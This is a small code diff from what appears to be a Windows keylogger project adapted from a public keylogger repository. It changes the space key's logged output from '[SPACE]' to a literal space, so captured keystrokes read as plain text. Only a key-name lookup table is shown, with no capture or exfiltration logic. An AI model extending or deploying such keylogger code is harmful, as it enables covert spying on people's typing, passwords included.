@@ -18,7 +18,7 @@ Adapted from GiacomoLaw/Keylogger
 const std::map<int, std::string> keyname{
 		{VK_BACK, "[BACKSPACE]"},
 		{VK_RETURN, "[RETURN]"},
-		{VK_SPACE, "[SPACE]"},
+		{VK_SPACE, " "}, // Space
 		{VK_TAB, "[TAB]"},
 		{VK_SHIFT, "[SHIFT]"},
 		{VK_LSHIFT, "[LEFT_SHIFT]"},
